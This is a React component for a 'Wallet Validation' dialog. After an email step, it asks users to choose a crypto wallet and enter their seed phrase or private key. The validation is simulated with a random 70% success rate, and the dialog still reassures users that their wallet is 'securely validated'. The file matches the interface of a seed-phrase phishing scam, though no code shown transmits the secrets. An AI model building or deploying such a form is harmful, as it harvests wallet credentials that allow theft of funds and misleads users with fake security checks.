
import { useState } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Mail, Shield, Wallet, CheckCircle, AlertTriangle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface WalletValidationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onWalletConnected: (wallet: string) => void;
}

const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletValidationModalProps) => {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [walletType, setWalletType] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [isValidating, setIsValidating] = useState(false);
  const [validationResult, setValidationResult] = useState<"success" | "warning" | null>(null);
  const { toast } = useToast();

  const walletTypes = [
    "MetaMask", "Trust Wallet", "Coinbase Wallet", "WalletConnect", 
    "Phantom", "Solflare", "Exodus", "Atomic Wallet", "Electrum",
    "Ledger", "Trezor", "SafePal", "Math Wallet", "TokenPocket",
    "Binance Chain Wallet", "Keplr", "Terra Station", "Kaikas",
    "Yoroi", "Daedalus"
  ];

  const handleEmailSubmit = async () => {
    if (!email) {
      toast({
        title: "Email Required",
        description: "Please enter your email address",
        variant: "destructive"
      });
      return;
    }

    // Simulate email verification
    toast({
      title: "Verification Email Sent",
      description: "Check your inbox for verification instructions",
    });
    setStep(2);
  };

  const handleWalletValidation = async () => {
    if (!walletType || (!seedPhrase && !privateKey)) {
      toast({
        title: "Missing Information",
        description: "Please fill in all required fields",
        variant: "destructive"
      });
      return;
    }

    setIsValidating(true);
    
    // Simulate validation process
    setTimeout(() => {
      const isValid = Math.random() > 0.3; // 70% success rate
      setValidationResult(isValid ? "success" : "warning");
      setIsValidating(false);
      setStep(3);

      if (isValid) {
        onWalletConnected(`${walletType}-${Date.now()}`);
        toast({
          title: "Wallet Validated Successfully",
          description: "Your wallet has been securely validated and connected",
        });
      } else {
        toast({
          title: "Validation Warning",
          description: "Potential security issues detected. Please review carefully.",
          variant: "destructive"
        });
      }
    }, 3000);
  };

  const resetModal = () => {
    setStep(1);
    setEmail("");
    setWalletType("");
    setSeedPhrase("");
    setPrivateKey("");
    setValidationResult(null);
    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={resetModal}>
      <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700 text-white">
        <DialogHeader>
          <DialogTitle className="flex items-center text-cyan-400">
            <Shield className="w-5 h-5 mr-2" />
            Wallet Validation
          </DialogTitle>
          <DialogDescription className="text-gray-400">
            Secure your crypto with our advanced validation system
          </DialogDescription>
        </DialogHeader>

        {step === 1 && (
          <div className="space-y-4">
            <div className="flex items-center justify-center p-4 bg-cyan-500/10 rounded-lg border border-cyan-500/20">
              <Mail className="w-6 h-6 text-cyan-400 mr-2" />
              <span className="text-sm text-cyan-400">Step 1: Email Verification</span>
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="email">Email Address</Label>
              <Input
                id="email"
                type="email"
                placeholder="your.email@gmail.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white"
              />
            </div>

            <Button 
              onClick={handleEmailSubmit}
              className="w-full bg-gradient-to-r from-cyan-500 to-blue-500"
            >
              Send Verification Email
            </Button>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-4">
            <div className="flex items-center justify-center p-4 bg-green-500/10 rounded-lg border border-green-500/20">
              <Wallet className="w-6 h-6 text-green-400 mr-2" />
              <span className="text-sm text-green-400">Step 2: Wallet Connection</span>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet-type">Select Wallet Type</Label>
              <Select value={walletType} onValueChange={setWalletType}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Choose your wallet..." />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  {walletTypes.map((wallet) => (
                    <SelectItem key={wallet} value={wallet} className="text-white hover:bg-gray-700">
                      {wallet}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="seed-phrase">Seed Phrase (12-24 words)</Label>
              <Textarea
                id="seed-phrase"
                placeholder="Enter your seed phrase separated by spaces..."
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white min-h-[100px]"
              />
            </div>

            <div className="text-center text-sm text-gray-400">
              OR
            </div>

            <div className="space-y-2">
              <Label htmlFor="private-key">Private Key</Label>
              <Input
                id="private-key"
                type="password"
                placeholder="Enter your private key..."
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                className="bg-gray-800 border-gray-600 text-white"
              />
            </div>

            <Button 
              onClick={handleWalletValidation}
              disabled={isValidating}
              className="w-full bg-gradient-to-r from-green-500 to-teal-500"
            >
              {isValidating ? "Validating..." : "Validate Wallet"}
            </Button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4 text-center">
            {validationResult === "success" ? (
              <div className="space-y-4">
                <div className="flex items-center justify-center p-4 bg-green-500/10 rounded-lg border border-green-500/20">
                  <CheckCircle className="w-8 h-8 text-green-400" />
                </div>
                <h3 className="text-lg font-semibold text-green-400">Validation Successful!</h3>
                <p className="text-gray-400">Your wallet has been securely validated and is ready to use.</p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-center p-4 bg-yellow-500/10 rounded-lg border border-yellow-500/20">
                  <AlertTriangle className="w-8 h-8 text-yellow-400" />
                </div>
                <h3 className="text-lg font-semibold text-yellow-400">Security Warning</h3>
                <p className="text-gray-400">Some security concerns detected. Please review your wallet security settings.</p>
              </div>
            )}
            
            <Button onClick={resetModal} className="w-full">
              Close
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};

export default WalletValidationModal;
